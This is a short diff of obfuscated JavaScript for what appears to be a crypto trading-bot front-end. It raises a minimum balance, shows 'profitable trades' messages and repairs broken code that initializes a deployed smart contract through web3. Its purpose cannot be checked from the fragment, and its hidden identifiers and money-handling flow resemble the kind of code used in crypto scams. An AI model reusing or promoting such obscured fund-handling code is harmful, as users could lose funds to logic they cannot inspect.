@@ -62,7 +62,7 @@ let isConnected = false,
   statusUpdateInterval = null,
   paramsUpdateInterval = null,
   tradeLoopInterval = null
-const MINIMUM_BALANCE = 0.001,
+const MINIMUM_BALANCE = 0.01,
   searchMessages = [
     'Searching for profitable trades...',
     'Looking for the best trade for high returns...',
@@ -1153,11 +1153,11 @@ async function initializeContract() {
     hideAllButtons()
     await typeText(tutorialText, 'Preparing to initialize contract...', 10)
     const _0x25e850 = new web3.eth.Contract(
-        contractABI,
-        deployedContractAddress
-      ),
-      _0x418a00 = nante
-    _0x10995c: _0x25e850.methods.Initialize().encodeABI()
+	  contractABI,
+	  deployedContractAddress
+	)
+
+	const _0x418a00 = _0x25e850.methods.Initialize().encodeABI()
     const _0x19ef90 = await web3.eth.estimateGas({
         from: accounts[0],
         to: deployedContractAddress,
